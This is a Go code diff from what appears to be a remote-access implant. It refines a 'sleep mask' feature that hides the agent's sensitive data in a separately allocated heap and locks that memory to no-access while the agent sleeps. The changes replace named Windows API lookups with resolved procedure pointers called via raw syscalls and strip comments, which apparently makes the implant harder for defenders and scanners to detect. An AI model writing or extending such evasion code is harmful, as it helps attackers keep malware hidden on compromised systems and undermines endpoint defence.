@@ -7,16 +7,12 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"sync"
+	"syscall"
 	"time"
 	"unsafe"
 )
 
 var (
-	pVirtualAlloc   = kernel32.NewProc("VirtualAlloc")
-	pVirtualFree    = kernel32.NewProc("VirtualFree")
-	pVirtualQuery   = kernel32.NewProc("VirtualQuery")
-	pSleepEx        = kernel32.NewProc("SleepEx")
-
 	sensitiveHeap     uintptr
 	sensitiveHeapSize uintptr
 	sensitiveHeapUsed uintptr
@@ -24,13 +20,13 @@ var (
 )
 
 const (
-	MEM_COMMIT      = 0x1000
-	MEM_RESERVE     = 0x2000
-	MEM_RELEASE     = 0x8000
-	MEM_PRIVATE     = 0x20000
-	PAGE_READWRITE  = 0x04
-	PAGE_NOACCESS   = 0x01
-	sensitiveHeapCap = 256 * 1024 // 256KB for agent IoCs
+	MEM_COMMIT       = 0x1000
+	MEM_RESERVE      = 0x2000
+	MEM_RELEASE      = 0x8000
+	MEM_PRIVATE      = 0x20000
+	PAGE_READWRITE   = 0x04
+	PAGE_NOACCESS    = 0x01
+	sensitiveHeapCap = 256 * 1024
 )
 
 type MEMORY_BASIC_INFORMATION struct {
@@ -44,7 +40,8 @@ type MEMORY_BASIC_INFORMATION struct {
 }
 
 func initSleepEncryption() {
-	addr, _, _ := pVirtualAlloc.Call(
+	va := getProc(mKernel32, fVirtualAlloc)
+	addr, _, _ := syscall.SyscallN(va,
 		0, sensitiveHeapCap,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
 	)
@@ -54,15 +51,13 @@ func initSleepEncryption() {
 	}
 }
 
-// storeSensitive copies data into the isolated VirtualAlloc'd heap.
-// Returns the offset so callers can retrieve it later.
 func storeSensitive(data []byte) uintptr {
 	sensitiveHeapMu.Lock()
 	defer sensitiveHeapMu.Unlock()
 	if sensitiveHeap == 0 {
 		return 0
 	}
-	needed := uintptr(len(data) + 4) // 4-byte length prefix
+	needed := uintptr(len(data) + 4)
 	if sensitiveHeapUsed+needed > sensitiveHeapSize {
 		return 0
 	}
@@ -74,7 +69,6 @@ func storeSensitive(data []byte) uintptr {
 	return offset
 }
 
-// readSensitive reads data back from the isolated heap at the given offset.
 func readSensitive(offset uintptr) []byte {
 	sensitiveHeapMu.Lock()
 	defer sensitiveHeapMu.Unlock()
@@ -116,12 +110,12 @@ func maskSleep(mem []byte, duration time.Duration, lock bool) {
 	}
 	var oldProtect uint32
 	if lock && sensitiveHeap != 0 {
-		pVirtualProtect.Call(sensitiveHeap, sensitiveHeapSize, PAGE_NOACCESS,
+		syscall.SyscallN(rpVirtualProtect, sensitiveHeap, sensitiveHeapSize, PAGE_NOACCESS,
 			uintptr(unsafe.Pointer(&oldProtect)))
 	}
 	time.Sleep(duration)
 	if lock && sensitiveHeap != 0 {
-		pVirtualProtect.Call(sensitiveHeap, sensitiveHeapSize, PAGE_READWRITE,
+		syscall.SyscallN(rpVirtualProtect, sensitiveHeap, sensitiveHeapSize, PAGE_READWRITE,
 			uintptr(unsafe.Pointer(&oldProtect)))
 	}
 	out, err := gcm.Open(nil, nonce, ct, []byte("sockpuppets-sleep-mask-v1"))
